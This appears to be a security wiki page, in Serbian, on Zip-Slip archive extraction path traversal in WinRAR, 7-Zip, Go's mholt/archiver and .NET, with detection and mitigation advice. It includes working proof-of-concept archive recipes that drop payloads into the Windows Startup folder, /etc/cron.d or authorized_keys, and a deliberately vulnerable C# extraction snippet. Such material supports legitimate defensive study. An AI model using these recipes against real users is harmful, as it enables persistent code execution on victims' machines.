# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Pregled

Mnogi arhivski formati (ZIP, RAR, TAR, 7-ZIP, itd.) dozvoljavaju da svaki unos nosi svoju **internu putanju**. Kada alat za ekstrakciju bez razmišljanja poštuje tu putanju, posebno oblikovano ime fajla koje sadrži `..` ili **apsolutnu putanju** (npr. `C:\Windows\System32\`) biće upisano van direktorijuma koji je korisnik izabrao.
Ova klasa ranjivosti je široko poznata kao *Zip-Slip* ili **archive extraction path traversal**.

Posledice variraju od prepisivanja proizvoljnih fajlova do direktnog postizanja **remote code execution (RCE)** postavljanjem payload-a u **auto-run** lokaciju, kao što je Windows *Startup* folder.

## Osnovni uzrok

1. Napadač kreira arhivu u kojoj jedno ili više zaglavlja fajlova sadrže:
* Relativne sekvence prelaska direktorijuma (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Apsolutne putanje (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ili specijalno kreirani **symlinks** koji se razrešavaju van ciljnog direktorijuma (uobičajeno u ZIP/TAR na *nix*).
2. Žrtva ekstrahuje arhivu koristeći ranjiv alat koji veruje ugrađenoj putanji (ili sledi symlinks) umesto da je sanitizuje ili da forsira ekstrakciju unutar izabranog direktorijuma.
3. Fajl se upisuje na lokaciju kojom kontroliše napadač i biće izvršen/učitan sledeći put kada sistem ili korisnik aktivira tu putanju.

### .NET `Path.Combine` + `ZipArchive` traversal

Čest .NET anti-pattern je kombinovanje željene destinacije sa **korisnički kontrolisanim** `ZipArchiveEntry.FullName` i ekstrakcija bez normalizacije putanje:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ako `entry.FullName` počinje sa `..\\`, dolazi do traversanja; ako je to **absolute path**, levi deo se u potpunosti odbacuje, što rezultira **arbitrary file write** kao identitetom za ekstrakciju.
- Proof-of-concept arhiva za upis u susedni direktorijum `app` koji je nadgledan od strane zakazanog skenera:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Stavljanje tog ZIP-a u nadgledani inbox dovodi do `C:\samples\app\0xdf.txt`, što dokazuje traversal izvan `C:\samples\queue\` i omogućava follow-on primitives (npr. DLL hijacks).

## Stvarni primer – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR za Windows (uključujući `rar` / `unrar` CLI, DLL i portable source) nije uspeo da validira imena fajlova pri ekstrakciji.
Zlonamerni RAR arhiv koji sadrži unos kao što je:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
bi završio **izvan** izabranog izlaznog direktorijuma i unutar korisnikovog *Startup* foldera. Nakon prijave, Windows automatski izvršava sve što se tamo nalazi, obezbeđujući *persistent* RCE.

### Kreiranje PoC arhive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – čuvaj putanje fajlova tačno kako su date (ne uklanjaj vodeći `./`).

Dostavite `evil.rar` žrtvi i uputite je da ga raspakuje pomoću ranjive verzije WinRAR-a.

### Posmatrana eksploatacija u divljini

ESET je izvestio o RomCom (Storm-0978/UNC2596) spear-phishing kampanjama koje su priložile RAR arhive koje zloupotrebljavaju CVE-2025-8088 za deploy prilagođenih backdoora i olakšavanje ransomware operacija.

## Noviji slučajevi (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Greška**: ZIP entry-ji koji su **symbolic links** bili su dereferencirani tokom ekstrakcije, što je napadačima omogućavalo bekstvo iz ciljne fascikle i prepisivanje proizvoljnih putanja. Interakcija korisnika je samo *otvaranje/raspakivanje* arhive.
* **Pogođeno**: 7-Zip 21.02–24.09 (Windows & Linux build-ovi). Ispravljeno u **25.00** (jul 2025) i kasnije.
* **Put uticaja**: Prepisivanje `Start Menu/Programs/Startup` ili lokacija koje pokreću servisi → kod se izvršava pri sledećem prijavljivanju ili restartu servisa.
* **Kratak PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Na ispravljenom buildu `/etc/cron.d` neće biti diran; symlink će biti ekstrahovan kao link unutar /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Greška**: `archiver.Unarchive()` prati `../` i symlink-ovane ZIP entry-je, pišući izvan `outputDir`.
* **Pogođeno**: `github.com/mholt/archiver` ≤ 3.5.1 (projekat je sada deprecated).
* **Ispravka**: Pređite na `mholt/archives` ≥ 0.1.0 ili implementirajte provere kanonizovanih putanja pre pisanja.
* **Minimalna reprodukcija**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Saveti za detekciju

* **Statička inspekcija** – Izdvojite listu entry-ja u arhivi i označite svaki naziv koji sadrži `../`, `..\\`, *apsolutne putanje* (`/`, `C:`) ili entry-je tipa *symlink* čija meta je van direktorijuma za ekstrakciju.
* **Kanonizacija** – Osigurajte da `realpath(join(dest, name))` i dalje počinje sa `dest`. Odbacite u suprotnom.
* **Ekstrakcija u sandboxu** – Raspakujte u privremeni direktorijum koristeći *siguran* extractor (npr., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i verifikujte da rezultujuće putanje ostaju unutar direktorijuma.
* **Praćenje endpoint-a** – Upozorite na nove izvršne fajlove zapisane u `Startup`/`Run`/`cron` lokacijama ubrzo nakon što je arhiva otvorena od strane WinRAR/7-Zip/itd.

## Ublažavanje i jačanje bezbednosti

1. **Ažurirajte extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitaciju putanja/symlink-ova. Oba alata i dalje nemaju automatsko ažuriranje.
2. Raspakujte arhive koristeći “**Do not extract paths**” / “**Ignore paths**” kada je moguće.
3. Na Unixu spustite privilegije i montirajte **chroot/namespace** pre ekstrakcije; na Windowsu koristite **AppContainer** ili sandbox.
4. Ako pišete sopstveni kod, normalizujte pomoću `realpath()`/`PathCanonicalize()` **pre** kreiranja/pisanja i odbacite bilo koji entry koji izmiče cilju.

## Dodatni pogođeni / istorijski slučajevi

* 2018 – Masivni *Zip-Slip* advisory od Snyk koji je uticao na mnoge Java/Go/JS biblioteke.
* 2023 – 7-Zip CVE-2023-4011 sličan traversal tokom `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR ekstrakcioni traversal u slug-ovima (patch u v1.2).
* Bilo koja prilagođena logika za ekstrakciju koja ne pozove `PathCanonicalize` / `realpath` pre pisanja.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
